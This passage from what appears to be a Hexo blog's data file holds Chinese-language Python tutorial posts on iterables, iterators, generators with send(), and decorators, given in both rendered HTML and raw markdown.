class=\"title\">consumer</span><span class=\"params\">(name)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">\"%s 准备吃包子啦!\"</span> %name)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">       baozi = <span class=\"keyword\">yield</span></span><br><span class=\"line\">       print(<span class=\"string\">\"包子[%s]来了,被[%s]吃了!\"</span> %(baozi,name))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">producer</span><span class=\"params\">(name)</span>:</span></span><br><span class=\"line\">    c1 = consumer(<span class=\"string\">'A'</span>)</span><br><span class=\"line\">    c2 = consumer(<span class=\"string\">'B'</span>)</span><br><span class=\"line\">    c1.__next__()</span><br><span class=\"line\">    c2.__next__()</span><br><span class=\"line\">    print(<span class=\"string\">\"老子开始准备做包子啦!\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"做了2个包子!\"</span>)</span><br><span class=\"line\">        c1.send(i)</span><br><span class=\"line\">        c2.send(i)</span><br><span class=\"line\">producer(<span class=\"string\">\"老子\"</span>)</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h4 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h4><ul>\n<li>可迭代对象：可用迭代工具（如for循环）迭代一次产生一个结果的对象。</li>\n<li>迭代器：可以记住取值的状态，一次返回一个值。</li>\n<li>可迭代对象执行<code>__iter__</code>方法，或者对应的iter()内置方法后，会返回一个迭代器。</li>\n<li>迭代工具：for、列表解析、in、map()等。</li>\n</ul>","more":"<h4 id=\"0x01-可迭代对象\"><a href=\"#0x01-可迭代对象\" class=\"headerlink\" title=\"0x01 可迭代对象\"></a>0x01 可迭代对象</h4><ul>\n<li>支持<code>__iter__</code>或<code>__getitem__</code>方法的对象就是可迭代对象。</li>\n<li>可迭代对象不等于迭代器，但是可迭代对象可以产生迭代器。</li>\n<li>可迭代对象可以多次打开（生成）迭代器。</li>\n<li>可迭代对象需要迭代器才能一次取一个值。</li>\n<li>for循环的实质也是先将可迭代对象先转换为迭代器。</li>\n</ul>\n<h5 id=\"0x02-可迭代对象产生迭代器\"><a href=\"#0x02-可迭代对象产生迭代器\" class=\"headerlink\" title=\"0x02 可迭代对象产生迭代器\"></a>0x02 可迭代对象产生迭代器</h5><ul>\n<li>调用内置方法iter()或重载方法<code>__iter__</code>后会返回一个迭代器。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 列表是可迭代对象，但不是迭代器</span></span><br><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>,<span class=\"number\">6</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 两种方法</span></span><br><span class=\"line\">iter(list) </span><br><span class=\"line\">list.__iter__()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>字典、元组、字符串、集合都是可迭代对象，但不是直接的迭代器。</li>\n</ul>\n<h5 id=\"0x03-判断是否为可迭代对象\"><a href=\"#0x03-判断是否为可迭代对象\" class=\"headerlink\" title=\"0x03 判断是否为可迭代对象\"></a>0x03 判断是否为可迭代对象</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Iterable</span><br><span class=\"line\"></span><br><span class=\"line\">isinstance([], Iterable) <span class=\"comment\">#True</span></span><br><span class=\"line\">isinstance(&#123;&#125;, Iterable) <span class=\"comment\">#True</span></span><br><span class=\"line\">isinstance(<span class=\"string\">'abc'</span>, Iterable) <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x04-迭代器\"><a href=\"#0x04-迭代器\" class=\"headerlink\" title=\"0x04 迭代器\"></a>0x04 迭代器</h4><ul>\n<li>支持<code>__next__</code>方法的对象就是迭代器。</li>\n<li>迭代器可以记住状态并每次返回一个值。</li>\n<li>取到最后一个值时会抛出一个StopIteration异常,依靠该异常可以判断到了边界。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>]</span><br><span class=\"line\">iterator = iter(list)</span><br><span class=\"line\"></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#返回1</span></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#返回2</span></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#返回3</span></span><br><span class=\"line\">iterator.__next__() <span class=\"comment\">#抛出异常StopIteration</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># iterator.__next__()等同于 next(iterator)</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"0x05-判断是否为迭代器\"><a href=\"#0x05-判断是否为迭代器\" class=\"headerlink\" title=\"0x05 判断是否为迭代器\"></a>0x05 判断是否为迭代器</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> collections <span class=\"keyword\">import</span> Iterator</span><br><span class=\"line\"></span><br><span class=\"line\">isinstance([], Iterator) <span class=\"comment\">#False</span></span><br><span class=\"line\">isinstance((x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>)), Iterator) <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x06-迭代工具-for\"><a href=\"#0x06-迭代工具-for\" class=\"headerlink\" title=\"0x06 迭代工具 for\"></a>0x06 迭代工具 for</h4><ul>\n<li>for循环的实质是：先将可迭代对象用iter()方法将其变为迭代器，再用迭代器的<code>__next__</code>方法逐一取值，最后捕获StopIteration异常判断结束。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># for i in [1, 2, 3, 4, 5]</span></span><br><span class=\"line\">it = iter([<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>])</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"comment\"># 获得下一个值:</span></span><br><span class=\"line\">        i = it.__next__()</span><br><span class=\"line\">    <span class=\"keyword\">except</span> StopIteration:</span><br><span class=\"line\">        <span class=\"comment\"># 遇到StopIteration就退出循环</span></span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"0x07-生成器-generator\"><a href=\"#0x07-生成器-generator\" class=\"headerlink\" title=\"0x07 生成器 generator\"></a>0x07 生成器 generator</h4><ul>\n<li>生成器函数编写使用常规def语句，与普通函数区别在于：生成器函数yield一个值，而不是return一个值。</li>\n<li>生成器函数：使用了yield语句的函数。可以每次返回一个值并可以从上次退出的地方继续的函数。</li>\n<li>yield将函数状态挂起，并向调用者返回一个值，没指定则返回none。挂起的状态包含整个本地作用域。</li>\n<li>调用生成器函数会返回一个生成器，生成器可以用迭代工具迭代。</li>\n<li>生成器本身也是一个迭代器（有<code>__next__</code>），而且是单迭代器对象，虽然有<code>__iter__</code>方法，但是没用，不能产生多个生成器。</li>\n<li>第一次执行<code>__next__（）</code>会从函数开始执行完全的一遍生成器函数，之后的next会从yield处开始。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">square</span><span class=\"params\">(num)</span>:</span> <span class=\"comment\">#定义生成器函数</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> i**<span class=\"number\">2</span></span><br><span class=\"line\">res = square(<span class=\"number\">5</span>) <span class=\"comment\">#生成生成器</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res: <span class=\"comment\">#迭代生成器</span></span><br><span class=\"line\">    print(i)</span><br></pre></td></tr></table></figure>\n<h5 id=\"0x08-表达解析式生成生成器\"><a href=\"#0x08-表达解析式生成生成器\" class=\"headerlink\" title=\"0x08 表达解析式生成生成器\"></a>0x08 表达解析式生成生成器</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 用圆括号</span></span><br><span class=\"line\">(i*<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">11</span>))</span><br></pre></td></tr></table></figure>\n<h5 id=\"0x09-send-：发送消息给生成器并返回发送的内容。\"><a href=\"#0x09-send-：发送消息给生成器并返回发送的内容。\" class=\"headerlink\" title=\"0x09 send()：发送消息给生成器并返回发送的内容。\"></a>0x09 send()：发送消息给生成器并返回发送的内容。</h5><ul>\n<li>会等同于<code>__next__</code>方法一样工作。</li>\n<li>还可以提供调用者与生成器之间的通信，即调用者可以用该方法发送信息给生成器。</li>\n<li>发送的消息由yield接收并返回，因此yield表达式可以写为：X=yield Y。yield每次会返回Y，同时也会接收send()发来的消息并赋值给X。</li>\n<li>遇到send()和yield都会进行中断。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 实现协程并行</span></span><br><span class=\"line\"><span class=\"comment\"># 生产者与消费者模型</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">consumer</span><span class=\"params\">(name)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">\"%s 准备吃包子啦!\"</span> %name)</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"keyword\">True</span>:</span><br><span class=\"line\">       baozi = <span class=\"keyword\">yield</span></span><br><span class=\"line\">       print(<span class=\"string\">\"包子[%s]来了,被[%s]吃了!\"</span> %(baozi,name))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">producer</span><span class=\"params\">(name)</span>:</span></span><br><span class=\"line\">    c1 = consumer(<span class=\"string\">'A'</span>)</span><br><span class=\"line\">    c2 = consumer(<span class=\"string\">'B'</span>)</span><br><span class=\"line\">    c1.__next__()</span><br><span class=\"line\">    c2.__next__()</span><br><span class=\"line\">    print(<span class=\"string\">\"老子开始准备做包子啦!\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">10</span>):</span><br><span class=\"line\">        time.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"做了2个包子!\"</span>)</span><br><span class=\"line\">        c1.send(i)</span><br><span class=\"line\">        c2.send(i)</span><br><span class=\"line\">producer(<span class=\"string\">\"老子\"</span>)</span><br></pre></td></tr></table></figure>"},{"title":"Python基础学习系列Chapter 10：装饰器","date":"2019-03-29T08:11:48.000Z","_content":"\n### 装饰器\n\n##### 0x00 概述\n\n> 装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。 \n>\n> 它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景 。\n>\n> 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 \n\n<!-- more -->\n\n##### 0x01 简单装饰器\n\n- 执行装饰函数(log())，并将被装饰函数(now())作为一个参数传给装饰函数。然后将装饰函数执行的返回值赋值给被装饰函数名。\n\n```python\ndef log(func):  #装饰函数\n    def wrapper():\n        print('Execute Function: %s' % func.__name__)\n        return func()\n    return wrapper\n\n@log  #等同于now = log(now)\n\ndef now():  #被装饰的函数\n    print('Execute Result : 2018-8-1')\n\nnow()  #相当于执行了wapper()\nprint(now.__name__) #返回wrapper ，而不是now。因为执行了now = wrapper。\n```\n\n##### 0x02 带参数的业务函数（被装饰函数）\n\n- 使用*args 和 **kwargs\n\n```python\ndef log(func):\n    def wrapper(*args, **kw):\n        print('Execute Function: %s' % func.__name__)\n        return func(*args, **kw)\n    return wrapper\n\n@log  #等同于now = log(now)\n\ndef now(tag):\n    print('Execute Result : 2018-8-1  %s'%tag)\n\nnow('tag1')  #相当于执行了wapper('tag1')\nprint(now.__name__) #返回wrapper ，而不是now。因为执行了now = wrapper。\n```\n\n##### 0x03 装饰器进阶：带参数的装饰器\n\n```python\ndef log(text):\n    def decorator(func):\n        def wrapper(*args, **kw):\n            print('%s %s():' % (text, func.__name__))\n            return func(*args, **kw)\n        return wrapper\n    return decorator\n\n@log('execute')  #等同于now = log('execute')(now),先执行后传函数\ndef now():\n    print('2015-3-25')\n\nnow()\nprint(now.__name__)  #返回wrapper ，而不是now。因为执行了now = wrapper。\n```\n\n> 先执行 log('execute') ，返回decorator函数；之后再像普通装饰器一样，执行decorator(now)，返回wrapper函数，并将wrapper函数赋值给now变量。\n\n- 总结：\n  - 假设：log函数为装饰器函数，now函数为普通函数。\n    - @log相当于 now=log(now)\n    - @log()相当于 now=log()(now)\n    - @log(“test”)相当于now=log(“test”)(now)\n\n#### 0x04 装饰器标准写法\n\n- 可以看到，前面的例子中，最后now函数的函数名（now.\\__name__）都变成了wrapper，这样可能会导致某些依靠判断函数名的语句出错。\n- 因此，可以通过导入functools模块，并使用@functools.wraps(func)解决，而不用使用语句：`now.__name__=func.__name__ `\n- 普通装饰器:\n\n```python\nimport functools\n\ndef log(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kw):\n        print('call %s():' % func.__name__)\n        return func(*args, **kw)\n    return wrapper\n\n@log\ndef now(tag):\n    print('Execute Result : 2018-8-1  %s'%tag)\n\nnow('tag1')  #相当于执行了wapper('tag1')\nprint(now.__name__) #返回now,而不是wrapper。\n```\n\n- 带参数的装饰器：\n\n```python\nimport functools\n\ndef log(text):\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args, **kw):\n            print('%s %s():' % (text, func.__name__))\n            return func(*args, **kw)\n        return wrapper\n    return decorator\n\n@log(\"execute\")\n\ndef now(tag):\n    print('Execute Result : 2018-8-1  %s'%tag)\n\nnow('tag1')  #相当于执行了wapper('tag1')\nprint(now.__name__) #返回now,而不是wrapper。\n```\n\n\n\n","source":"_posts/09python基础学习系列之装饰器.md","raw":"---\ntitle: Python基础学习系列Chapter 10：装饰器\ndate: 2019-03-29 16:11:48\ntags:\n\t- Python基础\n\t- Language\ncategories: Python\n---\n\n### 装饰器\n\n##### 0x00 概述\n\n> 装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。 \n>\n> 它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景 。\n>\n> 概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 \n\n<!-- more -->\n\n##### 0x01 简单装饰器\n\n- 执行装饰函数(log())，并将被装饰函数(now())作为一个参数传给装饰函数。然后将装饰函数执行的返回值赋值给被装饰函数名。\n\n```python\ndef log(func):  #装饰函数\n    def wrapper():\n        print('Execute Function: %s' % func.__name__)\n        return func()\n    return wrapper\n\n@log  #等同于now = log(now)\n\ndef now():  #被装饰的函数\n    print('Execute Result : 2018-8-1')\n\nnow()  #相当于执行了wapper()\nprint(now.__name__) #返回wrapper ，而不是now。因为执行了now = wrapper。\n```\n\n##### 0x02 带参数的业务函数（被装饰函数）\n\n- 使用*args 和 **kwargs\n\n```python\ndef log(func):\n    def wrapper(*args, **kw):\n        print('Execute Function: %s' % func.__name__)\n        return func(*args, **kw)\n    return wrapper\n\n@log  #等同于now = log(now)\n\ndef now(tag):\n    print('Execute Result : 2018-8-1  %s'%tag)\n\nnow('tag1')  #相当于执行了wapper('tag1')\nprint(now.__name__) #返回wrapper ，而不是now。因为执行了now = wrapper。\n```\n\n##### 0x03 装饰器进阶：带参数的装饰器\n\n```python\ndef log(text):\n    def decorator(func):\n        def wrapper(*args, **kw):\n            print('%s %s():' % (text, func.__name__))\n            return func(*args, **kw)\n        return wrapper\n    return decorator\n\n@log('execute')  #等同于now = log('execute')(now),先执行后传函数\ndef now():\n    print('2015-3-25')\n\nnow()\nprint(now.__name__)  #返回wrapper ，而不是now。因为执行了now = wrapper。\n```\n\n> 先执行 log('execute') ，返回decorator函数；之后再像普通装饰器一样，执行decorator(now)，返回wrapper函数，并将wrapper函数赋值给now变量。\n\n- 总结：\n  - 假设：log函数为装饰器函数，now函数为普通函数。\n    - @log相当于 now=log(now)\n    - @log()相当于 now=log()(now)\n    - @log(“test”)相当于now=log(“test”)(now)\n\n#### 0x04 装饰器标准写法\n\n- 可以看到，前面的例子中，最后now函数的函数名（now.\\__name__）都变成了wrapper，这样可能会导致某些依靠判断函数名的语句出错。\n- 因此，可以通过导入functools模块，并使用@functools.wraps(func)解决，而不用使用语句：`now.__name__=func.__name__ `\n- 普通装饰器:\n\n```python\nimport functools\n\ndef log(func):\n    @functools.wraps(func)\n    def wrapper(*args, **kw):\n        print('call %s():' % func.__name__)\n        return func(*args, **kw)\n    return wrapper\n\n@log\ndef now(tag):\n    print('Execute Result : 2018-8-1  %s'%tag)\n\nnow('tag1')  #相当于执行了wapper('tag1')\nprint(now.__name__) #返回now,而不是wrapper。\n```\n\n- 带参数的装饰器：\n\n```python\nimport functools\n\ndef log(text):\n    def decorator(func):\n        @functools.wraps(func)\n        def wrapper(*args, **kw):\n            print('%s %s():' % (text, func.__name__))\n            return func(*args, **kw)\n        return wrapper\n    return decorator\n\n@log(\"execute\")\n\ndef now(tag):\n    print('Execute Result : 2018-8-1  %s'%tag)\n\nnow('tag1')  #相当于执行了wapper('tag1')\nprint(now.__name__) #返回now,而不是wrapper。\n```\n\n\n\n","slug":"09python基础学习系列之装饰器","published":1,"updated":"2019-03-29T08:17:58.319Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83ke001i7or09mbm4ziv","content":"<h3 id=\"装饰器\"><a href=\"#装饰器\" class=\"headerlink\" title=\"装饰器\"></a>装饰器</h3><h5 id=\"0x00-概述\"><a href=\"#0x00-概述\" class=\"headerlink\" title=\"0x00 概述\"></a>0x00 概述</h5><blockquote>\n<p>装饰器本质上是一个 Python 函数或类，它可以让其他函数或类在不需要做任何代码修改的前提下增加额外功能，装饰器的返回值也是一个函数/类对象。 </p>\n<p>它经常用于有切面需求的场景，比如：插入日志、性能测试、事务处理、缓存、权限校验等场景 。</p>\n<p>概括的讲，装饰器的作用就是为已经存在的对象添加额外的功能。 </p>\n</blockquote>\n<a id=\"more\"></a>\n<h5 id=\"0x01-简单装饰器\"><a href=\"#0x01-简单装饰器\" class=\"headerlink\" title=\"0x01 简单装饰器\"></a>0x01 简单装饰器</h5><ul>\n<li>执行装饰函数(log())，并将被装饰函数(now())作为一个参数传给装饰函数。然后将装饰函数执行的返回值赋值给被装饰函数名。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(func)</span>:</span>  <span class=\"comment\">#装饰函数</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">'Execute Function: %s'</span> % func.__name__)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> func()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log  #等同于now = log(now)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">()</span>:</span>  <span class=\"comment\">#被装饰的函数</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">now()  <span class=\"comment\">#相当于执行了wapper()</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回wrapper ，而不是now。因为执行了now = wrapper。</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"0x02-带参数的业务函数（被装饰函数）\"><a href=\"#0x02-带参数的业务函数（被装饰函数）\" class=\"headerlink\" title=\"0x02 带参数的业务函数（被装饰函数）\"></a>0x02 带参数的业务函数（被装饰函数）</h5><ul>\n<li>使用*args 和 **kwargs</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">'Execute Function: %s'</span> % func.__name__)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log  #等同于now = log(now)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">(tag)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1  %s'</span>%tag)</span><br><span class=\"line\"></span><br><span class=\"line\">now(<span class=\"string\">'tag1'</span>)  <span class=\"comment\">#相当于执行了wapper('tag1')</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回wrapper ，而不是now。因为执行了now = wrapper。</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"0x03-装饰器进阶：带参数的装饰器\"><a href=\"#0x03-装饰器进阶：带参数的装饰器\" class=\"headerlink\" title=\"0x03 装饰器进阶：带参数的装饰器\"></a>0x03 装饰器进阶：带参数的装饰器</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(text)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decorator</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">            print(<span class=\"string\">'%s %s():'</span> % (text, func.__name__))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\">    <span class=\"keyword\">return</span> decorator</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log('execute')  #等同于now = log('execute')(now),先执行后传函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'2015-3-25'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">now()</span><br><span class=\"line\">print(now.__name__)  <span class=\"comment\">#返回wrapper ，而不是now。因为执行了now = wrapper。</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>先执行 log(‘execute’) ，返回decorator函数；之后再像普通装饰器一样，执行decorator(now)，返回wrapper函数，并将wrapper函数赋值给now变量。</p>\n</blockquote>\n<ul>\n<li>总结：<ul>\n<li>假设：log函数为装饰器函数，now函数为普通函数。<ul>\n<li>@log相当于 now=log(now)</li>\n<li>@log()相当于 now=log()(now)</li>\n<li>@log(“test”)相当于now=log(“test”)(now)</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"0x04-装饰器标准写法\"><a href=\"#0x04-装饰器标准写法\" class=\"headerlink\" title=\"0x04 装饰器标准写法\"></a>0x04 装饰器标准写法</h4><ul>\n<li>可以看到，前面的例子中，最后now函数的函数名（now.__name__）都变成了wrapper，这样可能会导致某些依靠判断函数名的语句出错。</li>\n<li>因此，可以通过导入functools模块，并使用@functools.wraps(func)解决，而不用使用语句：<code>now.__name__=func.__name__</code></li>\n<li>普通装饰器:</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> functools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">log</span><span class=\"params\">(func)</span>:</span></span><br><span class=\"line\"><span class=\"meta\">    @functools.wraps(func)</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wrapper</span><span class=\"params\">(*args, **kw)</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">'call %s():'</span> % func.__name__)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> func(*args, **kw)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> wrapper</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@log</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">now</span><span class=\"params\">(tag)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'Execute Result : 2018-8-1  %s'</span>%tag)</span><br><span class=\"line\"></span><br><span class=\"line\">now(<span class=\"string\">'tag1'</span>)  <span class=\"comment\">#相当于执行了wapper('tag1')</span></span><br><span class=\"line\">print(now.__name__) <span class=\"comment\">#返回now,而不是wrapper。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>带参数的装饰器：</li>\n</ul>\n<figure class=\"highlight 